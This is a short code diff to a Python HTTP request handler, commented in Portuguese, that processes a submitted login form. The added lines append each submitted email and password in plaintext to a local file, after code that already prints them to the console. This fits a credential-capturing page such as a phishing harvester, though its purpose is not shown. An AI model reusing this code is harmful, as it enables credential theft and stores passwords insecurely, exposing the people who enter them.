@@ -49,6 +49,12 @@ class MyHandler(SimpleHTTPRequestHandler):
             print("Email:", form_data.get('email', [''])[0])
             print("Senha:", form_data.get('password', [''])[0])
 
+            # armazena 
+            with open ('dados_login.txt', 'a') as file:
+                login = form_data.get('email', [''])[0]
+                senha = form_data.get('password', [''])[0]
+                file.write(f'{login};{senha}\n')
+
             # responde ao cliente
             self.send_response(200)
             self.send_header("Content-type", "text/html")
